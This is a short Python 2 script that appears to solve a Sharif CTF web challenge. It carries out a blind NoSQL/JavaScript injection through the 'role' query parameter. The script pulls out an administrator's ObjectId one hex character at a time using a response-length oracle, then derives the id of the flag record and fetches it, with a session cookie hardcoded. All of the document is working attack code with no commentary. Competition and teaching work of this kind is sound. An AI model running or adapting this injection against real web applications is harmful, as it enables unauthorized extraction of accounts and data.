#!/usr/bin/python

import urllib
import requests
import time

baseUrl = "http://ctf.sharif.edu:25489/api.php?q=users&role="
headers = {'X-Requested-With': 'XMLHttpRequest'}
cookies = dict(PHPSESSID='amuedn0ra3fhj0diatdb4kkkt1')
admin_id = ''

# Guessing admin id
for c in range(0, 24):
    print("[*] Guessing character "+str(c + 1))
    for x in range(0x10):
        letter = format(x,'x')
        query = "admin' && (this._id.str[" + str(c) + "]=='" + letter + "') && '1'=='1"
        url = baseUrl + urllib.quote_plus(query)
        response = requests.get(url, headers = headers, cookies=cookies)
        if len(response.text)==9:
            admin_id += format(x, 'x')
            print("    + Admin id guessed: " + admin_id)
            print("")
            break

        time.sleep(1)

# Getting the flag
print("[*] Go for the flag!")
flag_id = format(int(admin_id, 16) + 1, 'x')
url = "http://ctf.sharif.edu:25489/api.php?q=flag&id="+flag_id
response = requests.get(url, headers = headers, cookies=cookies)
print response.text